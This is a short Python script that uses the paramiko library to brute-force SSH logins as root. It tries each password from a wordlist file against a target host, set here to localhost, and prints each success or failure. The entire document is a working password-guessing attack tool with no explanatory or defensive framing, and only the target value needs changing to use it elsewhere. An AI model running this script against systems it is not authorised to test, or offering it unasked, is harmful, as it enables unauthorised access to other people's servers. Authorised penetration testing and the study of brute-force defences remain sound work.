import paramiko

user = "root"
target = "127.0.0.1"
pw_file = "passwords.txt"

def ssh_login(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=user, password=password)
        print(f'Successfully logged in with password: {password}')
        ssh.close()
    except paramiko.AuthenticationException:
        print(f'Failed to log in with password: {password}')
        ssh.close()

def main():
    with open(pw_file, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        ssh_login(password)

if __name__ == '__main__':
    main()
